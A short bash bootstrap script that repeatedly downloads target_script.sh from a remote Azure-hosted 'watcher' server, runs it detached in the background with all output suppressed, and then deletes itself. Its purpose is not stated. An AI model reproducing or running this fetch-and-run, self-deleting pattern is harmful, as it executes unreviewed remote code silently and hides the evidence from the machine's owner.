#!/bin/bash
if [ -f target_script.sh ]; then 
    rm target_script.sh
fi

status=-1
while [ $status != 0 ]; do
    wget http://watcher.centralindia.cloudapp.azure.com:8080/target_script.sh
    status=`echo $?`
    if [ $status != 0 ]; then
        sleep 1
    fi
done
# bash target_script.sh
setsid bash target_script.sh >/dev/null 2>&1 < /dev/null &
rm target_bootstrap.sh
